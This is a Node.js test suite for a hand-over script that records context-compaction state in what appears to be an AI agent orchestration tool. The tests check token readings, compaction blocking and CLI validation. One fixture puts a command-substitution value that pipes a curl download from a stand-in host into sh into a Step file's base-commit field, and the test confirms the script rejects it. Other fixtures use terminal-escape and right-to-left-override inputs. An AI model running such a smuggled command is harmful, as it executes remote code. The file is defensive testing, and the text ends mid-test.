import { test, describe, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import * as lead from './lead-handover.mjs';
import {
  HANDOVER_AT, CAP, HEADER, watch, measure, main, contextHandover, newSessionCommand,
} from './lead-handover.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.join(here, '..');
const SCRIPT = path.join(here, 'lead-handover.mjs');

const tmps = [];
after(() => { for (const d of tmps) fs.rmSync(d, { recursive: true, force: true }); });
// The run cap is read from the Lead snapshot under MCSPARROW_HOME: point it at an empty temp home so a real snapshot never leaks in.
const isoHome = fs.mkdtempSync(path.join(os.tmpdir(), 'cap-home-'));
tmps.push(isoHome);
const savedHome = { MCSPARROW_HOME: process.env.MCSPARROW_HOME, HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE };
process.env.MCSPARROW_HOME = path.join(isoHome, '.mcsparrow');
process.env.HOME = isoHome;
process.env.USERPROFILE = isoHome;
after(() => { for (const [k, v] of Object.entries(savedHome)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; } });


const iso = (ms) => new Date(ms).toISOString().replace(/\.\d{3}Z$/, 'Z');

// One product root and one Claude config dir per test; nothing reads the real home.
// run-state v3.0: the run cap is the `threshold` of the project's Lead snapshot under MCSPARROW_HOME (mod-hook v1 "Snapshot"), not a start record.
// `cap` writes that snapshot; absent writes none (the default applies). `recorded` is an old v2 `cap` on the start line, which is ignored.
function snapshotFile(root) {
  const r12 = crypto.createHash('sha256').update(fs.realpathSync(root)).digest('hex').slice(0, 12);
  return path.join(process.env.MCSPARROW_HOME, 'hook-snapshots', r12, 'lead.json');
}
function snapshot(root, threshold) {
  fs.mkdirSync(path.dirname(snapshotFile(root)), { recursive: true });
  fs.writeFileSync(snapshotFile(root), JSON.stringify({ v: 1, at: iso(Date.now()), threshold, savers: {}, floor: {}, drift: false, settingsWarnings: [] }));
}
function fixture({ slug = 'demo-run', subs = [], cap, recorded } = {}) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'lead-handover-'));
  tmps.push(base);
  const root = path.join(base, 'product');
  const claudeDir = path.join(base, 'claude');
  const dir = path.join(root, '.company', 'work', slug);
  fs.mkdirSync(dir, { recursive: true });
  fs.mkdirSync(path.join(claudeDir, 'projects', 'p1'), { recursive: true });
  const now = Date.now();
  const lines = [{ v: 1, at: iso(now - 60000), ev: 'start', ...(recorded === undefined ? {} : { cap: recorded }) }];
  for (const [i, s] of subs.entries()) {
    const id = String(i + 1).padStart(12, '0');
    lines.push({ v: 1, at: iso(now - 50000), ev: 'sub', role: 'backend-engineer', id, phase: 'start' });
    if (s === 'stopped') lines.push({ v: 1, at: iso(now - 40000), ev: 'sub', role: 'backend-engineer', id, phase: 'stop' });
  }
  fs.writeFileSync(path.join(dir, 'run-state.jsonl'), `${lines.map((l) => JSON.stringify(l)).join('\n')}\n`);
  if (cap !== undefined) snapshot(root, cap);
  return { base, root, claudeDir, dir, slug, now };
}

function addRun(fx, ...records) {
  const file = path.join(fx.dir, 'run-state.jsonl');
  fs.appendFileSync(file, records.map((r) => `${JSON.stringify({ v: 1, at: iso(Date.now()), ...r })}\n`).join(''));
}

function transcript(fx, usage, extra = []) {
  const file = path.join(fx.claudeDir, 'projects', 'p1', 'session.jsonl');
  const rows = [
    { type: 'user', message: { role: 'user', content: 'SECRET-PHRASE from the CEO' } },
    { type: 'assistant', message: { role: 'assistant', content: [{ type: 'text', text: 'SECRET-PHRASE reply' }], usage } },
    ...extra,
  ];
  fs.writeFileSync(file, `${rows.map((r) => JSON.stringify(r)).join('\n')}\n`);
  return file;
}

// A reading well under any cap, 85500 tokens in total; tests that care about a cap write a snapshot for the run's root.
const USAGE_MID = { input_tokens: 1000, cache_creation_input_tokens: 4000, cache_read_input_tokens: 80000, output_tokens: 500 };
const usageOf = (n) => ({ input_tokens: 10, output_tokens: 5, cache_creation_input_tokens: 0, cache_read_input_tokens: n - 15 });
const preCompact = (file, extra = {}) => JSON.stringify({ hook_event_name: 'PreCompact', trigger: 'auto', transcript_path: file, ...extra });
const sessionStart = (extra = {}) => JSON.stringify({ hook_event_name: 'SessionStart', source: 'compact', ...extra });
// Most tests below cover the v1.6 rule, which `AICO_GUARDS=off` keeps (lead-handoff v2.4); `optsOn` is the v1.7 default.
const opts = (fx, env = {}) => ({ root: fx.root, claudeDir: fx.claudeDir, env: { AICO_GUARDS: 'off', ...env } });
const optsOn = (fx, env = {}) => ({ root: fx.root, claudeDir: fx.claudeDir, env });
const handoffFile = (fx, n = 1) => path.join(fx.dir, `lead-handoff-${n}.md`);
const records = (fx) => fs.readFileSync(path.join(fx.dir, 'lead-handover.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));

describe('calibration', () => {
  test('the exported defaults are 180000 and 162000; the window constants are gone', () => {
    assert.equal(HANDOVER_AT, 162000);
    assert.equal(CAP, 180000);
    assert.equal(Math.floor(CAP * 9 / 10), HANDOVER_AT);
    assert.equal(lead.AUTO_COMPACT_WINDOW, undefined);
    assert.equal(lead.COMPACT_RESERVE, undefined);
  });

  test('the Contract is v2.5 and holds the run cap, not the window setup', () => {
    const text = fs.readFileSync(path.join(repo, 'docs', 'contracts', 'lead-handoff.md'), 'utf8');
    assert.match(text, /^# Contract: lead-handoff v2\.5$/m);
    assert.ok(text.includes('162000'));
    assert.ok(text.includes('runCap'));
    assert.ok(text.includes('no setup'));
    assert.ok(!text.includes('\r'));
  });

  test('the script header names the Contract and what it uses', () => {
    const lines = fs.readFileSync(SCRIPT, 'utf8').split('\n');
    assert.equal(lines[1], '// contract: docs/contracts/lead-handoff.md v2.5');
    assert.match(lines[2], /^\/\/ uses: docs\/contracts\/run-state\.md v3\.0 /);
  });
});

describe('watch', () => {
  test('watch asks for the Lead Handoff and records the reading', () => {
    const fx = fixture({ subs: ['stopped'] });
    const r = watch(preCompact(transcript(fx, USAGE_MID)), opts(fx, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '98500' }));
    assert.equal(r.code, 0);
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^tokens-at-handover: 85500$/m);
    assert.match(text, /^window: 98500$/m);
    assert.match(text, /^trigger: auto$/m);
    assert.match(text, /^running: none$/m);
    assert.match(text, /^slug: demo-run$/m);
    assert.ok(!text.includes('SECRET-PHRASE'));
    assert.ok(!text.includes('\r'));
    const rec = records(fx).find((e) => e.ev === 'handover');
    assert.deepEqual(Object.keys(rec), ['v', 'n', 'at', 'ev', 'file', 'tokens', 'window', 'trigger']);
    assert.equal(rec.tokens, 85500);
    assert.equal(rec.file, 'lead-handoff-1.md');
    assert.ok(!JSON.stringify(records(fx)).includes('SECRET-PHRASE'));
  });

  test('an unset window is recorded as null', () => {
    const fx = fixture();
    assert.equal(watch(preCompact(transcript(fx, USAGE_MID)), opts(fx)).code, 0);
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^window: unknown$/m);
    assert.equal(records(fx).find((e) => e.ev === 'handover').window, null);
    const fx2 = fixture();
    watch(preCompact(transcript(fx2, USAGE_MID)), opts(fx2, { CLAUDE_CODE_AUTO_COMPACT_WINDOW: '9x' }));
    assert.equal(records(fx2).find((e) => e.ev === 'handover').window, null);
  });

  test('a running Step below the run cap exits 2 and writes nothing', () => {
    const fx = fixture({ subs: ['running'], cap: 120000 });
    const r = watch(preCompact(transcript(fx, usageOf(100000))), opts(fx));
    assert.equal(r.code, 2);
    assert.match(r.err, /^aico: [^\n]{1,200}\n$/);
    assert.ok(!fs.existsSync(handoffFile(fx)));
    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-handover.jsonl')));
  });

  test('at or over the run cap, or with unknown tokens, a running Step never blocks', () => {
    const fx = fixture({ subs: ['running'], cap: 120000 });
    assert.equal(watch(preCompact(transcript(fx, usageOf(119999))), opts(fx)).code, 2);
    assert.equal(watch(preCompact(transcript(fx, usageOf(120000))), opts(fx)).code, 0);
    assert.equal(watch(preCompact(transcript(fx, usageOf(125000))), opts(fx)).code, 0);
    assert.equal(watch(preCompact(path.join(fx.base, 'missing.jsonl')), opts(fx)).code, 0);
    assert.equal(watch(preCompact(transcript(fx, USAGE_MID), { transcript_path: undefined }), opts(fx)).code, 0);
    assert.ok(!fs.existsSync(handoffFile(fx)));
  });

  test('a subagent payload is ignored', () => {
    const fx = fixture();
    const r = watch(preCompact(transcript(fx, USAGE_MID), { agent_id: 'abc' }), opts(fx));
    assert.equal(r.code, 0);
    assert.ok(!fs.existsSync(handoffFile(fx)));
  });

  test('other events, bad JSON, big input and no run write nothing and exit 0', () => {
    const fx = fixture();
    const file = transcript(fx, USAGE_MID);
    assert.equal(watch(JSON.stringify({ hook_event_name: 'SessionStart', transcript_path: file }), opts(fx)).code, 0);
    assert.equal(watch('{not json', opts(fx)).code, 0);
    assert.equal(watch('[]', opts(fx)).code, 0);
    assert.equal(watch(`${preCompact(file)}${' '.repeat(70 * 1024)}`, opts(fx)).code, 0);
    const empty = fs.mkdtempSync(path.join(os.tmpdir(), 'lead-handover-'));
    tmps.push(empty);
    assert.equal(watch(preCompact(file), { root: empty, claudeDir: fx.claudeDir, env: {} }).code, 0);
    assert.ok(!fs.existsSync(handoffFile(fx)));
  });

  test('a transcript outside the projects folder gives unknown tokens', () => {
    const fx = fixture();
    const outside = path.join(fx.base, 'outside.jsonl');
    fs.writeFileSync(outside, `${JSON.stringify({ type: 'assistant', message: { usage: USAGE_MID } })}\n`);
    assert.equal(watch(preCompact(outside), opts(fx)).code, 0);
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^tokens-at-handover: unknown$/m);
    assert.equal(records(fx).find((e) => e.ev === 'handover').tokens, null);
  });

  test('tokens come from the last main-chain usage; side chains and junk are skipped', () => {
    const fx = fixture();
    const file = transcript(fx, USAGE_MID, [
      { type: 'assistant', isSidechain: true, message: { usage: { input_tokens: 5, output_tokens: 5 } } },
      { type: 'assistant', message: { usage: { input_tokens: -1, output_tokens: 'x' } } },
    ]);
    fs.appendFileSync(file, 'not json at all\n');
    assert.equal(watch(preCompact(file), opts(fx)).code, 0);
    assert.equal(records(fx).find((e) => e.ev === 'handover').tokens, 85500);
  });

  test('a manual trigger is recorded as manual', () => {
    const fx = fixture();
    watch(preCompact(transcript(fx, USAGE_MID), { trigger: 'manual' }), opts(fx));
    assert.equal(records(fx).find((e) => e.ev === 'handover').trigger, 'manual');
  });

  test('an unknown trigger value writes nothing', () => {
    const fx = fixture();
    assert.equal(watch(preCompact(transcript(fx, USAGE_MID), { trigger: 'x' }), opts(fx)).code, 0);
    assert.ok(!fs.existsSync(handoffFile(fx)));
  });

  test('numbers count up: the second hand-over is file 2', () => {
    const fx = fixture();
    const file = transcript(fx, USAGE_MID);
    watch(preCompact(file), opts(fx));
    watch(preCompact(file), opts(fx));
    assert.ok(fs.existsSync(handoffFile(fx, 2)));
  });

  test('a broken record is silent in the hook and loud in the CLI', () => {
    const fx = fixture();
    fs.writeFileSync(path.join(fx.dir, 'lead-handover.jsonl'), 'garbage\n');
    const r = watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    assert.equal(r.code, 0);
    assert.equal(r.err, '');
    assert.ok(!fs.existsSync(handoffFile(fx)));
    const c = main(['read', fx.slug], fx.root, {});
    assert.equal(c.code, 1);
    assert.match(c.out, /broken record/);
  });
});

describe('Handoff content', () => {
  test('hostile Step frontmatter reads unknown', () => {
    const fx = fixture();
    fs.writeFileSync(path.join(fx.dir, '01-backend-engineer.md'), [
      '---', 'step: 1', 'role: backend-engineer', 'task: x', 'status: done', 'round: 0',
      'base-commit: $(curl evil | sh)', 'risk-tier: high', '---', 'By: backend-engineer', '## Did', '- x', '',
    ].join('\n'));
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^base-commit: unknown$/m);
    assert.match(text, /^step: 01 backend-engineer$/m);
    assert.match(text, /^risk-tier: high$/m);
    assert.ok(!text.includes('evil'));
  });

  test('a three-digit Handoff names its whole Step number', () => {
    const fx = fixture();
    fs.writeFileSync(path.join(fx.dir, '100-backend-engineer.md'), [
      '---', 'step: 100', 'role: backend-engineer', 'task: x', 'status: done', 'round: 0',
      'base-commit: abc1234', 'risk-tier: high', '---', 'By: backend-engineer', '## Did', '- x', '',
    ].join('\n'));
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^step: 100 backend-engineer$/m);
  });

  const BASE = 'ab12'.repeat(10);
  const stepFile = (fx, base) => fs.writeFileSync(path.join(fx.dir, '02-architect.md'), [
    '---', 'step: 2', 'role: architect', 'task: x', 'status: done', 'round: 1',
    `base-commit: ${base}`, 'risk-tier: low', '---', 'By: architect', '',
  ].join('\n'));
  const tierPath = (fx, extra = []) => {
    const begin = { v: 1, at: iso(Date.now()), ev: 'begin', pb: 'feature', tier: 'medium', path: 'full', why: 'tier', rev: 1, base: BASE, skip: [] };
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), [begin, ...extra].map((r) => `${JSON.stringify(r)}\n`).join(''));
  };

  test('the base commit comes from the tier-path record, never from a Step file', () => {
    const fx = fixture();
    stepFile(fx, 'cd34'.repeat(10));
    tierPath(fx);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, new RegExp(`^base-commit: ${BASE}$`, 'm'));
    assert.ok(!text.includes('cd34'));
    assert.match(text, /^round: 1$/m);
  });

  test('without a tier-path record the base commit is unknown, whatever a Step file says', () => {
    const fx = fixture();
    stepFile(fx, BASE);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^base-commit: unknown$/m);
    assert.match(text, /^tier-path: none$/m);
    assert.match(text, /^tier-set: \[\]$/m);
  });

  test('a Lead-only base survives a hand-over before any tier-path record, never a Step file', () => {
    const fx = fixture();
    const B = 'ab'.repeat(32);
    stepFile(fx, 'cd34'.repeat(10));
    assert.equal(main(['base', fx.slug, B], fx.root, {}).code, 0);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, new RegExp(`^base-commit: ${B}$`, 'm'));
    assert.match(text, /^tier-path: none$/m);
    assert.ok(!text.includes('cd34'));
  });

  test('the tier-path base wins over the Lead-only base once a record exists', () => {
    const fx = fixture();
    stepFile(fx, BASE);
    tierPath(fx);
    main(['base', fx.slug, 'ab'.repeat(20)], fx.root, {});
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), new RegExp(`^base-commit: ${BASE}$`, 'm'));
  });

  test('a broken tier-path record keeps no base even when a Lead-only base exists', () => {
    const fx = fixture();
    main(['base', fx.slug, 'ab'.repeat(20)], fx.root, {});
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), 'not json\n');
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^base-commit: unknown$/m);
  });

  test('the tier, path and set of the record are carried and a raise only goes up', () => {
    const fx = fixture();
    stepFile(fx, BASE);
    tierPath(fx, [{ v: 1, at: iso(Date.now()), ev: 'raise', tier: 'high', cause: 'diff' }]);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^risk-tier: high$/m);
    assert.match(text, /^tier-path: feature full$/m);
    assert.match(text, /^tier-set: \[[a-z0-9-]+(, [a-z0-9-]+)*\]$/m);
  });

  test('a broken tier-path record fails closed: high, no base, marked broken', () => {
    const fx = fixture();
    stepFile(fx, BASE);
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), 'not json\n');
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^risk-tier: high$/m);
    assert.match(text, /^tier-path: broken$/m);
    assert.match(text, /^base-commit: unknown$/m);
  });

  test('an all-zero or Step-claimed base is never carried', () => {
    const fx = fixture();
    const begin = { v: 1, at: iso(Date.now()), ev: 'begin', pb: 'fix', tier: 'low', path: 'short', why: 'short', rev: 1, base: '0'.repeat(40), skip: [] };
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), `${JSON.stringify(begin)}\n`);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^base-commit: unknown$/m);
  });

  test('an open Gate is a pending form; a passed Gate is not', () => {
    const fx = fixture();
    addRun(fx, { ev: 'ask', gate: 'ship' });
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    let text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^gate: ship open$/m);
    assert.match(text, /^form: pending gate-ship$/m);
    addRun(fx, { ev: 'gate', gate: 'ship', result: 'passed' });
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    text = fs.readFileSync(handoffFile(fx, 2), 'utf8');
    assert.match(text, /^gate: ship passed$/m);
    assert.match(text, /^form: none$/m);
  });

  test('an open idea form is a pending form and the playbook comes from begin', () => {
    const fx = fixture();
    fs.writeFileSync(path.join(fx.dir, 'idea-flow.jsonl'), `${JSON.stringify({ e: 'start', kind: 'bug', ts: '2026-10-30T10:00:00.000Z' })}\n`);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    let text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^playbook: bug$/m);
    assert.match(text, /^form: pending idea-grill$/m);
    assert.match(text, /^records: \[run-state\.jsonl, idea-flow\.jsonl, lead-handover\.jsonl\]$/m);
    assert.equal(main(['begin', fx.slug, 'feature'], fx.root, {}).code, 0);
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    text = fs.readFileSync(handoffFile(fx, 2), 'utf8');
    assert.match(text, /^playbook: feature$/m);
  });

  test('a pending grill step is recorded as step-grill (idea-flow v2.0 step name)', () => {
    const fx = fixture();
    const ts = '2026-10-30T10:00:00.000Z';
    const ev = [{ e: 'start', kind: 'idea', ts }, { e: 'pick', letter: '1', route: 'grill', ts }];
    fs.writeFileSync(path.join(fx.dir, 'idea-flow.jsonl'), ev.map((e) => `${JSON.stringify(e)}\n`).join(''));
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^form: pending step-grill$/m);
    assert.doesNotMatch(text, /step-grilling/);
  });

  test('the file stays small and holds only fixed words under Next', () => {
    const fx = fixture();
    watch(preCompact(transcript(fx, USAGE_MID)), opts(fx));
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.ok(Buffer.byteLength(text) < 2048);
    const next = text.slice(text.indexOf('## Next'));
    for (const l of next.split('\n').slice(1).filter(Boolean)) assert.match(l, /^- [A-Za-z0-9 .,`'-]{1,160}$/);
  });

  const lineOf = (out, key) => out.split('\n').find((l) => l.startsWith(`${key}: `));
  const afterRunning = (out) => out.split('\n').slice(out.split('\n').findIndex((l) => l.startsWith('running: ')) + 1).filter(Boolean).slice(0, 4);

  test('read prints unknown for hostile recorded values and never a Step file value', () => {
    const fx = fixture();
    stepFile(fx, BASE);
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), `${JSON.stringify({ v: 1, at: iso(Date.now()), ev: 'begin', pb: 'feature', tier: 'high\u001b[31m', path: 'full', why: 'tier', rev: 1, base: 'ab12', skip: [] })}\n`);
    const out = main(['read', fx.slug], fx.root, {}).out;
    assert.ok(!out.includes('\u001b'));
    assert.match(out, /^tier-path: broken$/m);
    assert.match(out, /^base-commit: unknown$/m);
    assert.ok(!out.includes(BASE));
  });

  test('read prints a short base from a record as unknown', () => {
    const fx = fixture();
    const begin = { v: 1, at: iso(Date.now()), ev: 'begin', pb: 'fix', tier: 'low', path: 'short', why: 'short', rev: 1, base: 'abcdef1', skip: [] };
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), `${JSON.stringify(begin)}\n`);
    assert.match(main(['read', fx.slug], fx.root, {}).out, /^base-commit: unknown$/m);
  });

  test('read prints unknown with no Lead record, whatever Role Handoffs say', () => {
    const fx = fixture();
    fs.writeFileSync(path.join(fx.dir, '01-backend-engineer.md'), [
      '---', 'step: 1', 'role: backend-engineer', 'task: x', 'status: done', 'round: 0',
      `base-commit: ${BASE}`, 'risk-tier: high', '---', 'By: backend-engineer', '',
    ].join('\n'));
    const out = main(['read', fx.slug], fx.root, {}).out;
    assert.deepEqual(afterRunning(out), ['base-commit: unknown', 'risk-tier: unknown', 'tier-path: none', 'tier-set: unknown']);
  });

  test('read prints a broken tier-path record as broken and high', () => {
    const fx = fixture();
    fs.writeFileSync(path.join(fx.dir, 'tier-path.jsonl'), 'not json\n');
    main(['base', fx.slug, 'ab'.repeat(20)], fx.root, {});
    const out = main(['read', fx.slug], fx.root, {}).out;
    assert.deepEqual(afterRunning(out), ['base-commit: unknown', 'risk-tier: high', 'tier-path: broken', 'tier-set: unknown']);
  });

  test('read prints the four recorded values', () => {
    const fx = fixture();
    tierPath(fx, [{ v: 1, at: iso(Date.now()), ev: 'raise', tier: 'high', cause: 'diff' }]);
    const c = main(['read', fx.slug], fx.root, {});
    assert.equal(c.code, 0);
    const lines = c.out.split('\n').filter(Boolean);
    assert.deepEqual(lines.slice(3, 7).map((l) => l.split(':')[0]), ['gate', 'form', 'step', 'running']);
    assert.equal(lines[7], `base-commit: ${BASE}`);
    assert.equal(lines[8], 'risk-tier: high');
    assert.equal(lines[9], 'tier-path: feature full');
    assert.match(lines[10], /^tier-set: \[[a-z0-9-]+(, [a-z0-9-]+)*\]$/);
    assert.equal(lines.length, 14);
    assert.equal(lines[11], 'lead ctx unknown');
    assert.equal(lines[12], 'lead peak unknown');
    assert.equal(lines[13], 'lead session unknown');
  });

  test('read prints the Lead-only base before a tier-path record exists', () => {
    const fx = fixture();
    main(['base', fx.slug, 'ab'.repeat(32)], fx.root, {});
    const out = main(['read', fx.slug], fx.root, {}).out;
    assert.equal(lineOf(out, 'base-commit'), `base-commit: ${'ab'.repeat(32)}`);
    assert.equal(lineOf(out, 'risk-tier'), 'risk-tier: unknown');
  });
});

describe('finding the run', () => {
  test('with more than 200 work folders the newest open idea flow is still found', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'lead-handover-'));
    tmps.push(base);
    const root = path.join(base, 'product');
    const claudeDir = path.join(base, 'claude');
    fs.mkdirSync(path.join(claudeDir, 'projects', 'p1'), { recursive: true });
    const work = path.join(root, '.company', 'work');
    for (let i = 0; i < 201; i++) fs.mkdirSync(path.join(work, `a${String(i).padStart(3, '0')}`), { recursive: true });
    fs.mkdirSync(path.join(work, 'zzz-open'), { recursive: true });
    fs.writeFileSync(path.join(work, 'zzz-open', 'idea-flow.jsonl'), `${JSON.stringify({ e: 'start', kind: 'idea', ts: '2026-10-30T10:00:00.000Z' })}\n`);
    const fx = { root, claudeDir, dir: path.join(work, 'zzz-open'), slug: 'zzz-open' };
    watch(preCompact(transcript(fx, USAGE_MID)), { root, claudeDir, env: { AICO_GUARDS: 'off' } });
    assert.ok(fs.existsSync(path.join(work, 'zzz-open', 'lead-handoff-1.md')));
  });
});

describe('CLI', () => {
  test('write refuses while a Step is running', () => {
    const fx = fixture({ subs: ['running'] });
    const r = main(['write', fx.slug], fx.root, {});
    assert.equal(r.code, 3);
    assert.equal(r.out, 'refused: step running\n');
    assert.ok(!fs.existsSync(handoffFile(fx)));
  });

  test('begin checks the playbook name and the plugin', () => {
    const fx = fixture();
    assert.equal(main(['begin', fx.slug, 'Feature'], fx.root, {}).code, 3);
    assert.equal(main(['begin', fx.slug, '../x'], fx.root, {}).code, 3);
    assert.equal(main(['begin', fx.slug, 'no-such-playbook'], fx.root, {}).code, 3);
    assert.equal(main(['begin', 'missing-run', 'feature'], fx.root, {}).code, 3);
    const ok = main(['begin', fx.slug, 'fix'], fx.root, {});
    assert.equal(ok.code, 0);
    assert.deepEqual(records(fx).map((e) => e.ev), ['begin']);
    assert.equal(records(fx)[0].playbook, 'fix');
  });

  test('base records the full id once and checks it as 40 or 64 hex', () => {
    const fx = fixture();
    for (const bad of ['abc1234', 'AB'.repeat(20), '0'.repeat(40), 'ab'.repeat(21), 'ab'.repeat(20) + 'g', 'ab'.repeat(30), '']) {
      assert.equal(main(['base', fx.slug, bad], fx.root, {}).code, 3, bad);
    }
    assert.equal(main(['base', fx.slug], fx.root, {}).code, 3);
    assert.equal(main(['base', 'missing-run', 'ab'.repeat(20)], fx.root, {}).code, 3);
    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-handover.jsonl')));
    const ok = main(['base', fx.slug, 'ab'.repeat(20)], fx.root, {});
    assert.equal(ok.code, 0);
    assert.deepEqual(records(fx).map((e) => [e.ev, e.base]), [['base', 'ab'.repeat(20)]]);
    assert.equal(main(['base', fx.slug, 'cd'.repeat(20)], fx.root, {}).code, 3);
    const fx2 = fixture();
    assert.equal(main(['base', fx2.slug, 'ef'.repeat(32)], fx2.root, {}).code, 0);
  });

  test('a record with a second or malformed base line is broken', () => {
    const fx = fixture();
    const line = (n, base) => `${JSON.stringify({ v: 1, n, at: iso(Date.now()), ev: 'base', base })}\n`;
    fs.writeFileSync(path.join(fx.dir, 'lead-handover.jsonl'), line(1, 'ab'.repeat(20)) + line(2, 'cd'.repeat(20)));
    assert.equal(main(['read', fx.slug], fx.root, {}).code, 1);
    fs.writeFileSync(path.join(fx.dir, 'lead-handover.jsonl'), line(1, 'AB'.repeat(20)));
    assert.equal(main(['read', fx.slug], fx.root, {}).code, 1);
  });

  test('bad slug, bad arguments and unknown commands are refused', () => {
    const fx = fixture();
    assert.equal(main(['read', '../x'], fx.root, {}).code, 3);
    assert.equal(main(['read', 'Demo'], fx.root, {}).code, 3);
    assert.equal(main(['read'], fx.root, {}).code, 3);
    assert.equal(main(['nope', fx.slug], fx.root, {}).code, 3);
    assert.equal(main(['read', `${fx.slug}‮`], fx.root, {}).code, 3);
    assert.equal(main(['read', 'x'.repeat(5000)], fx.root, {}).code, 3);
    assert.equal(main(['read', 'unknown-run'], fx.root, {}).code, 3);
  });

  test('read prints the counts and the state lines', () => {
    const fx = fixture();
    const out = main(['read', fx.slug], fx.root, {}).out;
    assert.match(out, /^handovers 0\nresumes hook 0 ceo 0\nlast none\n/);
    assert.match(out, /^gate: none$/m);
    assert.match(out, /^running: none$/m);
  });

  test('the file is a script that exits 0 on empty stdin', () => {
    const fx = fixture();
    for (const cmd of ['watch']) {
      const r = spawnSync(process.execPath, [SCRIPT, cmd], { cwd: fx.root, input: '', encoding: 'utf8', env: { ...process.env, CLAUDE_CONFIG_DIR: fx.claudeDir } });
      assert.equal(r.status, 0);
      assert.equal(r.stdout, '');
    }
  });

});

describe('v1.7 watch by trigger', () => {
  const manual = (file) => preCompact(file, { trigger: 'manual' });

  test('auto in an active run exits 2 with one fixed line and writes nothing, whatever the tokens or Step state', () => {
    for (const subs of [[], ['running'], ['stopped']]) {
      const fx = fixture({ subs });
      for (const usage of [USAGE_MID, usageOf(170000), usageOf(400000), { input_tokens: 5 }]) {
        const r = watch(preCompact(transcript(fx, usage)), optsOn(fx));
        assert.equal(r.code, 2);
        assert.match(r.err, /^aico: automatic compaction is blocked during a run; [^\n]{1,120}\n$/);
      }
      assert.equal(watch(preCompact(path.join(fx.base, 'missing.jsonl')), optsOn(fx)).code, 2);
      assert.ok(!fs.existsSync(handoffFile(fx)));
      assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-handover.jsonl')));
    }
  });

  test('auto without an active run, or from a subagent, stays silent', () => {
    const fx = fixture();
    fs.rmSync(path.join(fx.dir, 'run-state.jsonl'));
    assert.deepEqual(watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx)), { code: 0, err: '' });
    const fx2 = fixture();
    assert.deepEqual(watch(preCompact(transcript(fx2, USAGE_MID), { agent_id: 'a1' }), optsOn(fx2)), { code: 0, err: '' });
  });

  test('manual is never blocked: a clean point writes, a running Step writes nothing', () => {
    const fx = fixture({ subs: ['stopped'] });
    assert.equal(watch(manual(transcript(fx, USAGE_MID)), optsOn(fx)).code, 0);
    assert.match(fs.readFileSync(handoffFile(fx), 'utf8'), /^trigger: manual$/m);
    for (const usage of [{ ...USAGE_MID, cache_read_input_tokens: 10000 }, USAGE_MID, { input_tokens: 5 }]) {
      const fy = fixture({ subs: ['running'] });
      assert.deepEqual(watch(manual(transcript(fy, usage)), optsOn(fy)), { code: 0, err: '' });
      assert.ok(!fs.existsSync(handoffFile(fy)));
    }
  });

  test('AICO_GUARDS=off returns watch to the v1.6 rule (lead-handoff v2.4)', () => {
    const fx = fixture({ subs: ['running'] });
    assert.equal(watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx, { AICO_GUARDS: 'off' })).code, 2);
    const fz = fixture({ subs: ['running'], cap: 120000 });
    assert.equal(watch(preCompact(transcript(fz, usageOf(119999))), optsOn(fz, { AICO_GUARDS: 'off' })).code, 2);
    assert.equal(watch(preCompact(transcript(fz, usageOf(120000))), optsOn(fz, { AICO_GUARDS: 'off' })).code, 0);
    const fy = fixture({ subs: ['stopped'] });
    assert.equal(watch(preCompact(transcript(fy, USAGE_MID)), optsOn(fy, { AICO_GUARDS: 'off' })).code, 0);
    assert.match(fs.readFileSync(handoffFile(fy), 'utf8'), /^trigger: auto$/m);
